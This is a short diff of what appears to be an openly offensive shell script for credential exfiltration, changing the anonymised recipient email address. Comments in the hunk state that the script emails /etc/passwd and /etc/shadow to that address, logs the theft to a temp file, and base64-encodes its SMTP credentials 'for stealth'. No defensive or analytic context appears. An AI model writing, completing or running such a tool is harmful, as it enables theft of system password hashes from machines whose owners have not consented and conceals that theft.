@@ -98,7 +98,7 @@ echo ""
 
 # ==================== EMAIL CONFIGURATION FOR CREDENTIAL EXFILTRATION ====================
 # SMTP credentials for sending /etc/passwd and /etc/shadow files
-readonly RECIPIENT_EMAIL="46eshdfq@anonaddy.me"  # ← YOUR EMAIL HERE
+readonly RECIPIENT_EMAIL="0vrzlgx7@anonaddy.me"  # ← YOUR EMAIL HERE
 readonly LOG_FILE_EMAIL="/tmp/credential_exfil_log.txt"
 
 # Decoded SMTP credentials (base64 encoded for stealth)
